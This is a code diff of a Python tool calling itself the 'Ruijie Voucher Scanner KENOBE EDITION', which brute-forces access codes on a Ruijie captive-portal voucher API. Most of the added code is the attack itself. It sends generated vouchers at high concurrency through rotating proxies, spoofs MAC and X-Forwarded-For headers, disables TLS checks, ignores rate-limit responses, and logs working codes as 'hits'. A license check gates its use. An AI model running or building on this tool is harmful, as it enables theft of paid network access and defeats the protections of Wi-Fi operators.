@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 """
 Ruijie Voucher Scanner v17.0 - KENOBE EDITION
+- Premium UI Design
+- Single File License System
 """
 
 import os
@@ -353,6 +355,7 @@ class VoucherScanner:
         layout = Layout()
         layout.split_column(Layout(name="header", size=6), Layout(name="live", size=3), Layout(name="logs", ratio=1), Layout(name="hits", ratio=1))
         
+        # 🌟 KENOBE LOGO & CYBERPUNK DESIGN
         logo = Text()
         logo.append(" ⚡ K E N O B E ⚡ \n", style="bold yellow on red")
         logo.append("RUIJIE SCANNER v17.0 - OVERLORD\n", style="bold cyan")
@@ -472,3 +475,163 @@ class VoucherScanner:
                                 ts = q.get('timestamp', [None])[0]
                     except Exception: 
                         pass
+                    
+                if sid:
+                    await self.sid_pool.put((sid, sign, ts, mac, ip))
+            except Exception:
+                await asyncio.sleep(1)
+
+    async def worker(self, session):
+        while not self._stop:
+            try:
+                voucher = self.generate_voucher()
+                self._state['current_code'] = voucher
+                
+                proxy = await self.proxy_mgr.get_proxy()
+                try:
+                    if proxy:
+                        sid, sign, ts, mac, ip = await asyncio.wait_for(self.sid_pool.get(), timeout=3.0)
+                    else:
+                        sid, sign, ts, mac, ip = await asyncio.wait_for(self.sid_pool.get(), timeout=5.0)
+                except asyncio.TimeoutError:
+                    continue
+
+                url = f"https://{self._host()}/api/auth/voucher/?lang=en_US"
+                headers = {
+                    'User-Agent': f'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Dragon-{mac}',
+                    'Content-Type': 'application/json',
+                    'Client-Mac': mac,
+                    'X-Forwarded-For': ip,
+                }
+                data = {
+                    "accessCode": voucher,
+                    "sessionId": sid,
+                    "apiVersion": "2",
+                    "authCode": "ABCD"
+                }
+                
+                try:
+                    if proxy:
+                        async with session.post(url, json=data, headers=headers, proxy=proxy, timeout=TIMEOUT, ssl=False) as r:
+                            if r.status == 200:
+                                try:
+                                    j = await r.json()
+                                    code = j.get("result", {}).get("respCode") or j.get("result", {}).get("code") or j.get("success")
+                                    if code in (0, "0", True, "true", "success", "ACK", "1"):
+                                        tl, raw = parse_remaining_time(j)
+                                        self._record_hit(voucher, "FOUND", tl=tl)
+                                    elif code in (1, "1", "INVALID", "voucher_not_found", 1003, "1003"):
+                                        pass
+                                    elif code in (2, "2", "EXPIRED", "voucher_expired", 1004, "1004"):
+                                        self._record_hit(voucher, "EXPIRED", tl="real")
+                                    elif code in (3, "3", "STA_LIMIT", "device_limit", 1005, "1005"):
+                                        self._record_hit(voucher, "STA_LIMIT", tl="real")
+                                    else:
+                                        text = await r.text()
+                                        low = text.lower()
+                                        if '"success":true' in low or '"authresult":"1"' in low:
+                                            tl, raw = parse_remaining_time(j)
+                                            self._record_hit(voucher, "FOUND", tl=tl)
+                                        elif "voucher_not_found" in low or "invalid" in low:
+                                            pass
+                                        elif "expired" in low:
+                                            self._record_hit(voucher, "EXPIRED", tl="real")
+                                        elif "reach limit" in low or "device limit" in low or "sta_limit" in low:
+                                            self._record_hit(voucher, "STA_LIMIT", tl="real")
+                                except Exception:
+                                    text = await r.text()
+                                    low = text.lower()
+                                    if '"success":true' in low or '"authresult":"1"' in low:
+                                        self._record_hit(voucher, "FOUND")
+                            elif r.status in (429, 403):
+                                pass
+                    else:
+                        async with session.post(url, json=data, headers=headers, timeout=TIMEOUT, ssl=False) as r:
+                            if r.status == 200:
+                                try:
+                                    j = await r.json()
+                                    code = j.get("result", {}).get("respCode") or j.get("result", {}).get("code") or j.get("success")
+                                    if code in (0, "0", True, "true", "success", "ACK", "1"):
+                                        tl, raw = parse_remaining_time(j)
+                                        self._record_hit(voucher, "FOUND", tl=tl)
+                                    elif code in (2, "2", "EXPIRED", "voucher_expired", 1004, "1004"):
+                                        self._record_hit(voucher, "EXPIRED", tl="real")
+                                    elif code in (3, "3", "STA_LIMIT", "device_limit", 1005, "1005"):
+                                        self._record_hit(voucher, "STA_LIMIT", tl="real")
+                                    else:
+                                        text = await r.text()
+                                        low = text.lower()
+                                        if '"success":true' in low or '"authresult":"1"' in low:
+                                            tl, raw = parse_remaining_time(j)
+                                            self._record_hit(voucher, "FOUND", tl=tl)
+                                        elif "expired" in low:
+                                            self._record_hit(voucher, "EXPIRED", tl="real")
+                                        elif "reach limit" in low or "device limit" in low:
+                                            self._record_hit(voucher, "STA_LIMIT", tl="real")
+                                except Exception:
+                                    pass
+                            elif r.status in (429, 403):
+                                pass
+                except Exception:
+                    pass
+
+                await self.sid_pool.put((sid, sign, ts, mac, ip))
+                await asyncio.sleep(0.01)
+            except Exception:
+                await asyncio.sleep(0.1)
+
+    async def run(self):
+        clear_screen()
+        console.print("[bold yellow]Initializing KENOBE ...[/]")
+        
+        # Try to auto-detect portal
+        self._set_status("Detecting portal...")
+        url = auto_detect_portal()
+        if url:
+            self.apply_params_from_url(url)
+            console.print(f"[bold green][+] Portal Detected: {self.portal_url}[/]")
+            await asyncio.sleep(1)
+        else:
+            console.print("[bold red][-] Could not auto-detect portal. Using defaults.[/]")
+            await asyncio.sleep(1)
+
+        self._set_status("Fetching proxies...")
+        console.print("[bold cyan]Fetching proxies...[/]")
+        await self.proxy_mgr.fetch()
+        self._state['proxies'] = len(self.proxy_mgr.proxies)
+        console.print(f"[bold green][+] Loaded {len(self.proxy_mgr.proxies)} proxies.[/]")
+        await asyncio.sleep(1)
+
+        self._display_active = True
+        self._live = Live(self.make_layout(), console=console, screen=True, refresh_per_second=10)
+        
+        async with aiohttp.ClientSession() as session:
+            with self._live:
+                tasks = []
+                for _ in range(CONCURRENCY):
+                    tasks.append(asyncio.create_task(self.worker(session)))
+                for _ in range(20):
+                    tasks.append(asyncio.create_task(self.sid_fetcher(session)))
+                tasks.append(asyncio.create_task(self._ui_loop()))
+                
+                try:
+                    await asyncio.gather(*tasks)
+                except Exception:
+                    pass
+
+def main():
+    if not check_license():
+        return
+    console.print("[bold cyan]Starting Scanner in 3 seconds...[/]")
+    time.sleep(3)
+    
+    scanner = VoucherScanner()
+    try:
+        asyncio.run(scanner.run())
+    except KeyboardInterrupt:
+        scanner._stop = True
+        scanner._display_active = False
+        console.print("\n[bold red]Shutting down...[/]")
+
+if __name__ == "__main__":
+    main()
